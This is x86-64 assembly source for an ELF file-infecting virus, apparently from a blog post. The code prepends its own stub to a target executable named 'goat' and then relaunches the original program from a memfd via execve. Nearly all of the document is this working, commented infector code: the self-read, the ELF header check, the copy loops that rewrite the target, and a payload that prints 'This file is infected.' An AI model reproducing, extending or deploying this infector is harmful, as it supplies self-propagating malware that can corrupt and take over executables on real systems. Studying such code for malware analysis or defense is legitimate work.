format ELF64 executable
use64

; XXX: You have to set this to the resulting ELF file size manually.
SIZE equ ??

sys_execve equ 59
sys_open equ 2
sys_lseek equ 8
sys_memfd_create equ 319
sys_sendfile equ 40
sys_write equ 1
sys_close equ 3
sys_exit equ 60

entry _start

memfd_path: db '/proc/self/fd/',0,0
self: db '/proc/self/exe'
empty: db 0
size: dq SIZE

load_elf:
    ; Open ourselves.
    xor esi, esi
    mov edi, self
    push sys_open
    pop rax
    syscall
    ; Obtain the length: seek to back.
    mov r8, rax
    mov rdi, r8
    push sys_lseek
    pop rax
    syscall
    ; Call memfd_create, call with MFD_CLOEXEC.
    mov edi, empty
    push 1
    pop rsi
    push sys_memfd_create
    pop rax
    syscall
    ; Copy the file contents to the memfd using sendfile.
    mov edx, size
    mov r9, rax
    mov rdi, rax
    mov rsi, r8
    sub r10d, SIZE
    push sys_sendfile
    pop rax
    syscall
    ; Close the file descriptor we hold to our own binary.
    push sys_close
    pop rax
    mov rdi, r8
    syscall
    ; Bravely assume that the memfd descriptor number is a single digit.
    ; This might or might not work all of the times, but improving upon
    ; this is trivially beyond the scope of this post.
    add r9d, 48
    mov BYTE [memfd_path + 14], r9b
    ret

_start:
    ; Run the virus code.
    call payload
    ; Load the executable to a memfd.
    call load_elf
    ; Load the path to the executable
    mov rdi, memfd_path
    ; Prepare to call execve
    ; Load argc + argv
    lea rsi, [rsp + 8]
    ; Load argp
    mov rdx, [rsp]
    lea rdx, [rsp+8 + rdx*8 + 8]
    ; Perform the syscall
    push sys_execve
    pop rax
    syscall
    ; Exit in case execve returns due to error.
    mov rdi, -1
    push sys_exit
    pop rax
    syscall


; Infect a file. Take the name in `rdi`.
infect:
    ; Reserve some space on the stack for the buffer.
    sub rsp, 944
    ; Open `rdi`.
    push sys_open
    pop rbx
    mov rsi, rbx
    mov rax, rbx
    syscall
    ; Read the ELF header.
    mov r9d, eax
    lea rsi, [rsp - 128]
    ; Read 64 bytes.
    push 64
    pop rdx
    mov rdi, r9
    ; Notice: we're using `rax` as the syscall number here.
    ; 0 is the syscall number for `read`, hence I did not define it
    ; to save a few bytes.
    xor eax, eax
    syscall
    ; Verify the file header.
    movq xmm0, qword [rsi]
    movd eax, xmm0
    ; 0x7F and the magic 0x464C45 ("ELF").
    cmp eax, 0x464C457F
    jne .no_infect
    ; Check the amount of sections. Our dropper/stub
    ; has no sections, so we will assume that the file
    ; with no sections has been infected already.
    ; There are better ways, but they require more
    ; implementation effort.
    cmp word [rsp - 68], 0
    je .no_infect
    ; Open the current executable.
    ; RBX is still sys_open.
    mov rdi, self
    xor esi, esi
    mov rax, rbx
    syscall
    ; Open a memfd. 
    mov r10d, eax
    mov rdi, empty
    push sys_memfd_create
    pop rax
    mov rsi, r8
    syscall
    ; Copy the infection stub to the memfd.
    mov ebx, eax
    ; Buffer. Read the infection stub here and write it to the memfd.
    lea r15, [rsp - 64]
    ; Read SIZE bytes from ourselves.
    mov edx, SIZE
    mov rdi, r10
    mov rsi, r15
    xor eax, eax
    syscall
    ; Write them to the memfd: this is the ELF stub.
    mov edx, SIZE
    mov rdi, rbx
    mov rax, r8
    syscall
    ; Seek to the beginning of the the goat file.
    ; We have read the ELf headers, but we need them back.
    push sys_lseek
    pop r14
    mov rdi, r9
    xor esi, esi
    xor edx, edx
    mov rax, r14
    syscall
    ; Copy the goat file to the memfd in SIZE-big chunks.
.copygoat:
    ; Read SIZE bytes from the goat file.
    mov edx, SIZE
    mov rdi, r9
    mov rsi, r15
    xor eax, eax
    syscall
    ; Check if we have read more than 0 bytes.
    mov rdi, rbx
    test rax, rax
    jle .copygoat_end
    ; Write the data to the memfd now.
    mov rsi, r15
    mov rdx, rax
    mov rax, r8
    syscall
    ; Loop.
    jmp .copygoat
.copygoat_end:
    ; Seek to the beginning of the memfd and the goat file.
    xor esi, esi
    xor edx, edx
    mov rax, r14
    syscall
    mov rdi, r9
    mov rax, r14
    syscall
    ; Load the buffer again.
    lea rsi, [rsp - 64]
.copymemfd:
    ; Read SIZE bytes from the memfd file.
    mov edx, SIZE
    mov rdi, rbx
    xor eax, eax
    syscall
    ; Check if we have read more than 0 bytes.
    test rax, rax
    jle .copymemfd_end
    ; Write the data to the goat file.
    mov rdi, r9
    mov rdx, rax
    mov rax, r8
    syscall
    jmp .copymemfd
.copymemfd_end:
    ; Close all the file descriptors.
    ; RAX gets trashed so we need to save the syscall# elsewhere.
    push sys_close
    pop rdx
    mov rdi, rbx
    mov rax, rdx
    syscall
    mov rdi, r9
    mov rax, rdx
    syscall
    mov rdi, r10
    mov rax, rdx
    syscall
.no_infect:
    add rsp, 944
    ret

; Name of the file we want to infect.
inf: db "goat", 0
msg: db 'This file is infected.', 10, 0
payload:
    ; Print the "This file is infected." message.
    mov rsi, msg
    push sys_write
    pop r8
    mov rdx, 23
    mov rdi, r8
    mov rax, r8
    syscall
    ; Infect the file.
    mov rdi, inf
    jmp infect
